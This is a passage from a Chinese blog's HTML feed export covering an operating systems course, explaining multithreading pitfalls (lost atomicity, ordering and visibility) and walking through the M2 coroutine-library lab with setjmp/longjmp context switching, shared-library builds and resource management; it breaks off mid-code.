flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug_pmm(<span class="string">&quot;kfree(%X)&quot;</span>, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>  执行<code>make test=pmm smp=8 run</code>命令，调用测试框架中的压力测试，结果如下图所示<br>  <img src="实验结果.png" alt="实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现-三</title>
      <link href="/2021/08/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%B8%89/"/>
      <url>/2021/08/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  这一章稍微介绍一下多线程程序存在的问题，以及实现课程中的M2实验</p><h1 id="多线程程序存在的问题"><a href="#多线程程序存在的问题" class="headerlink" title="多线程程序存在的问题"></a>多线程程序存在的问题</h1><p>  这里，我们将使用二段代码，说明多线程程序中存在的各种问题。第一段代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> n 100000000</span></span><br><span class="line"><span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">do_sum</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  create(do_sum);</span><br><span class="line">  create(do_sum);</span><br><span class="line">  join(print);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  其中，<code>create</code>和<code>join</code>是包装<strong>pthread</strong>库的函数。<br>  如果我们采用<strong>O0</strong>优化，即执行<code>gcc -O0</code>，则其输出基本一直是介于<strong>100000000</strong>到<strong>200000000</strong>的值;</p><p>  如果我们采用<strong>O1</strong>优化，即执行<code>gcc -O1</code>，则其输出基本一直是<strong>100000000</strong>;</p><p>  如果我们采用<strong>o2</strong>优化，即执行<code>gcc -O2</code>，则其输出基本一直是<strong>200000000</strong>。 可以看到，不同优化等级下，多线程输出的值却各部一样。实际上，这些分别表示了多线程变成中的一些问题</p><h2 id="原子性的丧失"><a href="#原子性的丧失" class="headerlink" title="原子性的丧失"></a>原子性的丧失</h2><p>  实际上，最好理解的是采用<strong>O0</strong>优化的程序的输出结果:看似<code>sum++</code>是一条原子语句，其执行不可分割。但实际上其仍由包括<strong>取值</strong>、<strong>运算</strong>和<strong>存值</strong>等多个指令构成，并且由于多个线程可以在不同处理器上并行执行，因此这些指令可能随时会在中途被中断，从而导致部分执行自增语句读取的是改变之前的值，从而导致其值变小</p><h2 id="顺序的丧失"><a href="#顺序的丧失" class="headerlink" title="顺序的丧失"></a>顺序的丧失</h2><p>  实际上编译器为了程序性能提升，在进行代码优化的时候，会默认程序只在一个线程(处理器)上执行的顺序语义，这实际上就解释了程序采用<strong>O1</strong>和<strong>O2</strong>优化时的输出<br>  对于<strong>O1</strong>优化，由于sum变量经过连续的写操作，其中间的值不会被读取(单线程下)，并被最后一次的值覆写，因此可以直接被优化成最后一次覆写;并且由于<strong>O1</strong>下的优化会保留逻辑结构，因此循环仍然被保留，其代码被优化为如下伪代码形式</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_sum</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">long</span> temp = sum;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123; ; &#125;</span><br><span class="line"></span><br><span class="line">temp += n;</span><br><span class="line">sum = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  由于中间循环实际很长，因此第一个执行程序在完成读取操作后，被中断在中间循环处;然后第二个程序同样会完成读取操作….。这样子也就导致了最终数值总是被覆写。</p><p>  而对于<strong>O2</strong>优化，其循环被优化掉了，则被优化的伪代码如下<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_sum</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">long</span> tmp = sum;</span><br><span class="line"></span><br><span class="line">tmp += n;</span><br><span class="line">sum = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  这样子一个时间片内，基本上可以完整的执行整个函数，因此数值不会被覆写掉</p><h3 id="可见性的丧失"><a href="#可见性的丧失" class="headerlink" title="可见性的丧失"></a>可见性的丧失</h3><p>  下面的代码及其结果，可以非常好的展示多线程编程下，程序可见性的丧失<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="keyword">volatile</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">thread1</span><span class="params">()</span> &#123;</span><br><span class="line">  [<span class="number">1</span>] x = <span class="number">1</span>;   <span class="comment">// write(x)</span></span><br><span class="line">  [<span class="number">2</span>] ty = y;  <span class="comment">// read(y)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">thread2</span><span class="params">()</span> &#123;</span><br><span class="line">  [<span class="number">3</span>] y = <span class="number">1</span>;   <span class="comment">// write(y)</span></span><br><span class="line">  [<span class="number">4</span>] tx = x;  <span class="comment">// read(x)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  正常情况下，[2]操作必定在[1]操作之后执行;[4]操作必定在[3]操作之后执行，即最后<code>x</code>或<code>y</code>中，至少应该有一个为1。但实际上，结果中会出现<code>x</code>和<code>y</code>都是0的情况。<br>  其原因在于处理器的<strong>乱序执行</strong>特性上——当正在执行的指令和下一条待执行的指令没有(单线程下)数据依赖关系时，当当前指令处于<strong>Cache Miss</strong>时，其会修改指令的执行顺序，去先执行后面的指令，之后在执行当前的指令。<br>  在这个案例中，由于<code>thread1</code>函数<code>x</code>和<code>y</code>是不同的变量，因此其可以进行乱序执行;对于<code>thread2</code>是同理。因此最终会导致意想不到的输出结果</p><h1 id="M2协程库-libco"><a href="#M2协程库-libco" class="headerlink" title="M2协程库(libco)"></a>M2协程库(libco)</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>  总所周知，每个线程(执行流)都有自己独立的寄存器和堆栈。我们实际上可以在用户空间中模拟多线程——对于堆栈，我们可以使用代码为每个线程分别进行分配;对于寄存器，我们可以将”当前不在执行的线程”的寄存器保存在内存中，然后在这些寄存器现场进行切换即可。</p><p>  在<strong>Python/Javascript</strong>中，我们可以使用<strong>yield</strong>来定义如下的”死循环”函数</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">positive_integers</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i := i + <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">yield</span> i <span class="comment"># &quot;output&quot; i</span></span><br></pre></td></tr></table></figure><p>  这个函数可以<strong>生成</strong>所有的整数，并被其他函数使用</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">return</span> i &gt;= <span class="number">2</span> <span class="keyword">and</span> <span class="literal">True</span> <span class="keyword">not</span> <span class="keyword">in</span> (i % j == <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, i))</span><br><span class="line"></span><br><span class="line">primes = (i <span class="keyword">for</span> i <span class="keyword">in</span> positive_integers() <span class="keyword">if</span> is_prime(i)) <span class="comment"># 所有素数的顺序集合</span></span><br></pre></td></tr></table></figure><p>  在C语言中，函数调用会从<code>call</code>指令开始，执行到<code>ret</code>指令结束，结束后所有的对于函数的局部数据的访问都是<strong>undefined behavior</strong>。其会因为无终止的<strong>生成</strong>所有整数，而导致资源消耗殆尽，最终异常中止<br>  但是对于<strong>python</strong>来说，<code>positive_integers</code>不会无限地执行下去。当其执行到<code>yield</code>时，<code>positive_integers</code>会暂停执行。之后可以通过<code>next</code>再一次进入<code>positive_integers</code>函数中进行执行，而函数内部的状态<code>i</code>被保存下来，再下一次调用时进行递增<br>  因此，我们希望在<code>C</code>中实现类似的代码，其能够</p><ol><li>可以被调用，且从头开始运行</li><li>在运行时，允许被<strong>切换</strong>出去</li><li><p>之后可以<strong>恢复执行</strong>，即回到被切换时的状态继续执行</p><p>为了能让函数调用被切换，并且之后还可以恢复执行，我们需要在内存中为该函数调用分配<strong>寄存器</strong>和<strong>堆栈</strong>(被称为函数调用的上下文，context)，即主动管理上下文切换的<strong>协程(coroutine)</strong>。<br>如果我们允许协程在任意时刻被中断并切换到其他协程执行，我们就得到了<strong>用户态线程(user-level threads)</strong></p></li></ol><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><p> 在该实验中，实现一个轻量级的用户协程(coroutine)，可以在一个不支持线程的操作系统上实现共享内存多任务并发。</p><h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p> 实验要求实现动态链接库(shared object, .so文件，就像libc，pthread，SDL2等库一样)libc.so，实现以下libco.h中定义的API:<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> co *<span class="title function_">co_start</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> (*func)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span>       <span class="title function_">co_yield</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span>       <span class="title function_">co_wait</span><span class="params">(<span class="keyword">struct</span> co *co)</span>;</span><br></pre></td></tr></table></figure></p><p> 链接libco.so的程序被赋予使用协程库的能力，它和pthread相当类似:</p><ol><li><code>co_start(name, func, arg)</code>创建一个新的协程，并返回一个指向<code>struct co</code>的指针(类似于<code>pthread_create</code>)<ul><li>新创建的协程从函数<code>func</code>开始执行，并传入参数<code>arg</code>。新创建的协程不会立即执行，而是调用<code>co_start</code>的协程继续执行</li><li>使用协程的应用程序不需要知道<code>struct co</code>的具体定义，因此请把该定义留在<code>co.c</code>中;框架代码中并没有限定<code>struct co</code>结构体的设计，所以可以自由发挥</li></ul></li><li><code>co_wait(co)</code>表示当前协程需要等待，直到<code>co</code>协程的执行完成后才能继续执行(类似于<code>pthread_join</code>)<ul><li>在被等待的协程结束后，<code>co_wait()</code>返回前，<code>co_start</code>分配的<code>struct co</code>需要被释放。如果你使用<code>malloc()</code>，需要使用<code>free()</code>释放即可</li><li>因此，每个协程只能被<code>co_wait()</code>一次(使用协程库的程序应当保证除了初始协程外，其他协程都必须被<code>co_wait()</code>恰好一次，否则会造成内存泄漏)</li></ul></li><li>协程运行后一直在CPU上执行，直到<code>func</code>函数返回或调用<code>co_yield()</code>使当前运行的协程暂时放弃执行。调用<code>co_yield()</code>会切换到其他协程执行。当系统中有多个可运行的协程时(包括当前协程)，你应当随机选择下一个系统中可运行的协程</li><li><code>main()</code>函数的执行也是一个协程，因此可以在<code>main()</code>中调用<code>co_yield()</code>。<code>main()</code>函数返回后，无论有多少协程，进程都将直接终止。</li></ol><h3 id="协程的使用"><a href="#协程的使用" class="headerlink" title="协程的使用"></a>协程的使用</h3><p> 下面是一个协程使用的例子，创建了两个(永不结束的)协程，分别打印<code>a</code>和<code>b</code>。由于<code>co_yield()</code>之后切换到的协程是随机的(可能切换到它自己)，因此可能会看到随机的<strong>ab</strong>交替出现的序列，例如<strong>ababba…</strong><br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;co.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">entry</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)arg);</span><br><span class="line">   co_yield();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">co</span> *<span class="title">co1</span> =</span> co_start(<span class="string">&quot;co1&quot;</span>, entry, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">co</span> *<span class="title">co2</span> =</span> co_start(<span class="string">&quot;co2&quot;</span>, entry, <span class="string">&quot;b&quot;</span>);</span><br><span class="line"> co_wait(co1); <span class="comment">// never returns</span></span><br><span class="line"> co_wait(co2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当然，协程有可能会返回，例如在下面的例子(测试程序)中，两个协程会交替执行，共享<strong>counter</strong>变量<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;co.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count = <span class="number">1</span>; <span class="comment">// 协程之间共享</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">entry</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s[%d] &quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)arg, count++);</span><br><span class="line">   co_yield();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">co</span> *<span class="title">co1</span> =</span> co_start(<span class="string">&quot;co1&quot;</span>, entry, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">co</span> *<span class="title">co2</span> =</span> co_start(<span class="string">&quot;co2&quot;</span>, entry, <span class="string">&quot;b&quot;</span>);</span><br><span class="line"> co_wait(co1);</span><br><span class="line"> co_wait(co2);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p> 此时协程明显会正常结束，其输出应该类似下面的结果，<strong>b[1] a[2] b[3] b[4] a[5] b[6] b[7] a[8] a[9] a[10] Done</strong>，其字母是随机顺序各出现5次</p><h3 id="协程和线程"><a href="#协程和线程" class="headerlink" title="协程和线程"></a>协程和线程</h3><p> 协程和线程的API非常相似。例如<strong>threads.h</strong>中提供的<br> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">(<span class="type">void</span> (*func)(<span class="type">void</span> *))</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">join</span><span class="params">(<span class="type">void</span> (*func)())</span>;</span><br></pre></td></tr></table></figure></p><p> 刚好对应了<code>co_start()</code>和<code>co_wait()</code>(join会在main返回后，对每个创建的线程调用<code>pthread_join()</code>，依次等待他们结束)。唯一不同的是，线程的调度不是由线程决定的(由操作系统和硬件决定);但协程除非执行<code>co_yield()</code>主动切换到另一个协程运行，当前的代码就会一直执行下去。<br> 协程会在执行<code>co_yield()</code>时主动让出处理器，调度到另一个协程执行。因此，如果能保证<code>co_yield()</code>的定时执行，我们甚至可以在进程里实现线程。这就是很多操作系统教科书上所讲的<strong>用户态线程</strong>。<br> 协程与线程的区别在于协程是完全在应用程序内(低特权运行级)实现的，不需要操作系统的支持，占用的资源也比操作系统线程更小一些。协程可以随时切换执行流的特性，用于实现状态机、actor model等。前面提到的<strong>python</strong>语言中的<code>generator</code>，也是一种特殊的协程，其每次<code>co_yield</code>，都会将控制流返回给其调用者，而非本实验的随机选择。</p></blockquote><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><p>  整体上，如果我们想随时切换执行流的执行，只需要保存并切换执行流的上下文即可——也就是寄存器和堆栈。<br>  而由于C语言是一个高级语言，其将计算机底层实现细节进行了屏蔽，因此我们需要通过C语言提供的<strong>内敛汇编</strong>机制，在C中利用汇编语言操作计算机的寄存器和堆栈等数据</p><h3 id="编译成动态链接库"><a href="#编译成动态链接库" class="headerlink" title="编译成动态链接库"></a>编译成动态链接库</h3><p>  本实验要把源文件编译成后缀名为<code>.so</code>的共享库。共享库可以有自己的代码、数据，且可以调用其他的库函数;共享库中全局的符号将能被加载共享库的应用程序调用;共享库不需要入口(<code>main</code>函数)。<br>  一般来说，编译共享库的规则如下<br>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(NAME)</span>-64.so: <span class="variable">$(DEPS)</span></span><br><span class="line">gcc -fPIC -shared -m64 <span class="variable">$(CFLAGS)</span> <span class="variable">$(SRCS)</span> -o <span class="variable">$@</span> <span class="variable">$(LDFLAGS)</span></span><br></pre></td></tr></table></figure></p><p>  其中，<code>-fPIC</code>、<code>-shared</code>就代表编译成位置无关代码的共享库。除此之外，共享库和普通的二进制文件没有特别的区别。</p><h3 id="编写自己的程序链接共享库"><a href="#编写自己的程序链接共享库" class="headerlink" title="编写自己的程序链接共享库"></a>编写自己的程序链接共享库</h3><p>  实际上，实验文件夹下包含一组协程库的测试用例，包含了编译和运行所需要的脚本，其中的编译选项如下所示<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -I.. -L.. -m64 main.c -o libco-test-64 -lco-64</span><br><span class="line">gcc -I.. -L.. -m32 main.c -o libco-test-32 -lco-32</span><br></pre></td></tr></table></figure></p><p>  注意到<code>-I</code>和<code>-L</code>选项的使用:</p><ul><li><code>-I</code>选项代表<strong>include path</strong>，添加寻找程序中通过尖括号引用的头文件的路径</li><li><code>-L</code>选项代表增加<strong>link search path</strong>，添加寻找程序所依赖的动态链接库的路径</li><li><p><code>-l</code>选项代表链接某个库，链接时会自动加上<code>lib</code>的前缀，即<code>-lco-64</code>会依次在库函数的搜索路径中查找<code>libco-64.so</code>和<code>libco-64.a</code>，直到找到为止。</p><p>在运行时，使用<code>make test</code>直接运行，它执行的命令是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_LIBRARY_PATH=.. ./libco-test-64</span><br></pre></td></tr></table></figure><p>如果不设置<code>LD_LIBRARY_PATH</code>环境变量，则系统会产生<strong>error while loading shared libraries: libco-xx.so: cannot open shared object file: No such file or directory</strong>的错误。</p><p>这里再额外说明以下，为什么动态链接在编译链接和运行时都需要指定动态链接库的位置信息<br>实际上，编译时指定动态链接库的位置信息，是为了获取动态链接库中的符号表信息，其不仅包含在动态链接库的头文件中，还包含在动态链接库的<code>.so</code>文件中(如未在头文件中声明的非静态全局函数);而运行时指定动态链接库的位置信息，是为了获取动态链接库中的代码信息。</p></li></ul><h3 id="协程切换-分析"><a href="#协程切换-分析" class="headerlink" title="协程切换:分析"></a>协程切换:分析</h3><p>  正如前面分析的，切换协程时，即保存协程当前的上下文，并载入随机选择的协程上下文。<br>  因此，根据前面的分析，为了实现协程的切换(即<code>co_yield()</code>)，实际上需要做的事情是:</p><ol><li>为每一个协程分配独立的堆栈;堆栈顶的指针由<code>%rsp</code>/<code>%esp</code>寄存器确定</li><li>在<code>co_yield()</code>发生时，将寄存器保存到属于该协程的<code>struct co</code>中</li><li><p>切换到另一个协程执行，找到系统中的另一个协程，然后恢复它<code>struct co</code>中的寄存器现场</p><p>实际上，堆栈数据实际上就是栈的数据，其通过<code>%rsp</code>/<code>%esp</code>寄存器确定，因此保存和恢复寄存器，也就相当于保存和恢复协程的堆栈数据</p></li></ol><h3 id="实现寄存器现场切换"><a href="#实现寄存器现场切换" class="headerlink" title="实现寄存器现场切换"></a>实现寄存器现场切换</h3><p>  前面已经说过了，C语言作为高级语言，其已经屏蔽了计算机的底层细节，包括寄存器和堆栈等。但我们如果要实现寄存器现场切换，就势必要读、写指定的寄存器。<br>  因此，这里我们需要使用C语言提供的<strong>内敛汇编</strong>拓展，可以查阅<a href="http://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html">相关参考</a></p><blockquote><p><u>这里需要特别说明的是——<strong>堆栈对齐</strong></u><br><strong>x86-64</strong>要求堆栈按照16字节对齐(x86-64的堆栈以8字节为一个单元，这是为了确保<strong>SSE</strong>指令集中<strong>XMM</strong>寄存器变量的对齐。如下:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movaps %xmm0,0x50(%rsp)</span><br><span class="line">movaps %xmm1,0x60(%rsp)</span><br></pre></td></tr></table></figure><br>当然，<strong>x86-64</strong>并不是一直要求堆栈对齐的——在<code>call</code>指令之时按16字节对齐;在<code>call</code>指令之后没有特殊要求</p></blockquote><p>  每当<code>co_yield()</code>发生时，我们都会选择一个协程继续执行，此时必定为以下两种情况之一:</p><ol><li>选择的协程是新创建的，此时该协程还没有执行过任何代码。则我们首先需要创建该协程的上下文数据，然后切换上下文数据即可。</li><li>选择的协程是调用<code>co_yield()</code>切换出来的，此时直接切换上下文数据即可</li></ol><h3 id="实现协程"><a href="#实现协程" class="headerlink" title="实现协程"></a>实现协程</h3><p>  实际上，协程中最重要的就是<strong>setjmp</strong>/<strong>longjmp</strong>，其用于保存寄存器现场/恢复寄存器现场，可以模拟操作系统中的上下文切换。可以详细阅读<a href="">相关样例</a></p><p>  在参考实现中，我们需要维护一个<strong>当前运行的协程</strong>的指针(类似于操作系统中，为每一个CPU维护一个<strong>当前运行的进程</strong>)，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">co</span> *<span class="title">current</span>;</span></span><br></pre></td></tr></table></figure></p><p>  这样，在<code>co_yield()</code>中，我们进行切换上下文现场时就非常方便，只需要将当前的上下文重新保存到<code>current</code>指向的协程结构中，并且重新指向待切换协程的上下文，并恢复该上下文即可。如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">co_yield</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> val = setjmp(current-&gt;context);</span><br><span class="line"><span class="keyword">if</span>(val == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//此时上下文为未切换前的协程</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//此时上下文为切换后的协程</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  根据<code>man 3 setjmp</code>可知，<code>setjbmp()</code>函数实际上会返回两次:</p><ol><li>在<code>co_yield()</code>被调用时，<code>setjmp()</code>保存寄存器现场后会立即返回0，此时我们需要选择下一个待运行的协程，并切换至该协程中。这里原线程的<code>co_yield()</code>并没有执行完，执行到跳转部分后，其剩余的代码就永远不会被执行了。</li><li><code>setjmp()</code>是由另一个<code>longjmp()</code>返回的，此时一定是因为某个协程调用<code>co_yield()</code>，此时代表了寄存器现场的恢复，因此不必做任何操作，直接返回</li></ol><h3 id="资源初始化、管理和释放"><a href="#资源初始化、管理和释放" class="headerlink" title="资源初始化、管理和释放"></a>资源初始化、管理和释放</h3><blockquote><p><u>需要初始化?</u><br>如果你希望在程序运行前完成一系列的初始化工作，可以定义<code>__attribute__((constructor))</code>属性的函数，他们会在<code>main()</code>函数执行前被运行</p></blockquote><p>  实际上，这个实验最后的麻烦就是管理<code>co_start()</code>时分配的<code>struct co</code>结构体资源。很多时候，我们的库函数都涉及到资源的管理。<br>  协程中的资源管理有些微妙，在<code>co_wait()</code>执行的时候，有两种不同的可能性:</p><ol><li>此时协程已经结束。则<code>co_wait()</code>直接回收资源即可</li><li><p>此时协程尚未结束，因此<code>co_wait()</code>不能继续执行，必须调用<code>co_yield()</code>切换到其他协程执行，知道协程结束后唤醒。</p><p>如果允许在任意时刻、任意多次等待任意协程，那么协程创建时分配的资源就无法做到自动回收——即使一个协程结束，也无法预知未来是否还会执行对该协程的<code>co_wait()</code>，而对已经回收的指针的<code>co_wait()</code>，可能导致<strong>use-after-free</strong>。因此，更为合理的做法是假设每个协程都会被<code>co_wait()</code>一次，且在<code>co_wait()</code>返回时释放掉内存</p></li></ol><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  只需要切换到master分支，并且从github上继续拉取<strong>M2</strong>实验即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add jyy https://hub.fastgit.org/NJU-ProjectN/os-workbench.git &amp;&amp; git checkout master &amp;&amp; git pull jyy M2</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其实现，<a href="https://gitee.com/jiaweihawk/nju-os/tree/6c645ce624caf6c8b7d3d3bb0399a133178bfb48">实验实现</a></p><h3 id="struct-co结构体定义"><a href="#struct-co结构体定义" class="headerlink" title="struct co结构体定义"></a><code>struct co</code>结构体定义</h3><p>  我们首先要定义的，就是<code>co</code>这个协程结构。我们按照材料中给的参考实现的<code>struct co</code>进行定义即可，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 